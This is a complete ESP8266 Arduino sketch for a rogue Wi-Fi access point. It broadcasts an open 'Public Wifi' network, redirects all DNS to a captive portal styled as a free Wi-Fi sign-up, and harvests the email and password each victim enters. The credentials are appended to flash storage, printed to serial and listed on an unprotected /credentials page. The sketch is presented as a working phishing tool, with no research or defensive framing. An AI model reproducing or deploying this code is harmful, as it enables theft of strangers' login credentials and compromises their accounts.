#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>

const byte DNS_PORT = 53;
const char* ssid = "Public Wifi";

DNSServer dnsServer;
ESP8266WebServer webServer(80);

void setup() {
  Serial.begin(74880);
  SPIFFS.begin();

  WiFi.softAP(ssid);
  delay(500);

  // Set up captive portal
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.on("/credentials", HTTP_GET, handleCredentials);
  webServer.on("/clear-credentials", HTTP_GET, clearCredentials);
  webServer.onNotFound(handleRoot);
  webServer.begin();

  printSavedCredentials();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  webServer.send(200, "text/html", loginPage());
}

// Credentials logic
void handleLogin() {
  String email = webServer.arg("email");
  String password = webServer.arg("password");

  saveCredentials(email, password);
  webServer.send(200, "text/html", confirmationPage());
}

void handleCredentials() {
  String page = credentialsPage();
  webServer.send(200, "text/html", page);
}

void saveCredentials(String email, String password) {
  FSInfo fs_info;
  SPIFFS.info(fs_info);

  // Check if there is enough space to write new credentials
  size_t estimatedSize = email.length() + password.length() + 2;  // +2 for ':' and '\n'
  if (fs_info.totalBytes - fs_info.usedBytes < estimatedSize) {
    // Handle the error: not enough space
    Serial.println("Not enough space to save new credentials.");
    return;
  }

  File f = SPIFFS.open("/credentials.txt", "a");
  if (f) {
    f.println(email + ":" + password);
    f.close();
  } else {
    // Handle the error: file open failed
    Serial.println("Failed to open file for appending.");
  }
}

void printSavedCredentials() {
  Serial.println("Printing saved credentials if any.");
  File f = SPIFFS.open("/credentials.txt", "r");
  if (f) {
    while (f.available()) {
      String line = f.readStringUntil('\n');
      Serial.println(line);
    }
    f.close();
  }
}

// Content
String htmlStart() {
  return "<!DOCTYPE html><html>" + commonHeadElements() + "<body><div class='container'>";
}

String htmlEnd() {
  return "</div></body></html>";
}

String commonHeadElements() {
  return "<head>"
         "<title>Welcome to Free WiFi</title>"
         "<style>"
         "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(to right, #6DD5FA, #FF758C); text-align: center; padding: 50px; color: #333; }"
         ".container { background-color: #ffffff; padding: 40px; margin: auto; width: 90%; max-width: 400px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }"
         "h2 { color: #333; }"
         "input[type='email'], input[type='password'] { width: calc(100% - 20px); padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }"
         "input[type='submit'] { background-color: #4CAF50; color: white; padding: 14px 20px; margin: 8px 0; border: none; border-radius: 4px; cursor: pointer; width: 100%; }"
         "input[type='submit']:hover { background-color: #45a049; }"
         "ul { list-style-type: none; padding: 0; text-align: left; }"
         "li { margin: 5px 0; }"
         "</style>"
         "</head>";
}

String loginPage() {
  return htmlStart() + "<h2>Get Your Free WiFi Access!</h2>"
                       "<p>Sign up now and enjoy high-speed internet!</p>"
                       "<form action='/login' method='POST'>"
                       "<input type='email' name='email' placeholder='Enter Email' required><br>"
                       "<input type='password' name='password' placeholder='Enter Password' required minlength='6'><br>"
                       "<input type='submit' value='Sign Up & Connect'>"
                       "</form>"
                       "<p>Join us and stay connected wherever you are!</p>"
                       "<div class='terms'>"
                       "<p>By signing up, you agree to our <strong>Terms and Conditions</strong>:</p>"
                       "<ul>"
                       "<li>Do not use the service for illegal activities.</li>"
                       "<li>Respect other users' privacy and data.</li>"
                       "<li>Avoid sending spam or malicious content.</li>"
                       "<li>The service is provided 'as is' without warranties.</li>"
                       "</ul>"
                       "<p>Enjoy responsibly and stay safe online!</p>"
                       "</div>"
         + htmlEnd();
}

String confirmationPage() {
  return htmlStart() + "<h2>Successfully Connected!</h2>"
                       "<p>Welcome aboard! You're now connected to our free WiFi.</p>"
                       "<div class='info'>"
                       "<p>Enjoy unlimited browsing and stay connected with your world. Don't forget to check out our premium plans for even faster internet speeds!</p>"
                       "</div>"
                       "<button onclick=\"location.href='https://www.google.com'\">Continue to Google.</button>"
         + htmlEnd();
}

String credentialsPage() {
  String credentialsList = "<ul>";
  File f = SPIFFS.open("/credentials.txt", "r");
  if (f) {
    while (f.available()) {
      credentialsList += "<li>" + f.readStringUntil('\n') + "</li>";
    }
    f.close();
  }
  credentialsList += "</ul>";

  return htmlStart() + "<h2>Saved Credentials</h2>" + credentialsList + "<button onclick=\"location.href='/clear-credentials'\">Clear All Credentials</button>"
                                                                        "<button onclick=\"location.href='/'\">Home</button>"
         + htmlEnd();
}

void clearCredentials() {
  SPIFFS.remove("/credentials.txt");
  String clearedPage = htmlStart() + "<h2>Credentials Cleared</h2>"
                                     "<p>All saved credentials have been successfully cleared.</p>"
                                     "<button onclick=\"location.href='/credentials'\">Back to Credentials</button>"
                                     "<button onclick=\"location.href='/'\">Home</button>"
                       + htmlEnd();
  webServer.send(200, "text/html", clearedPage);
}
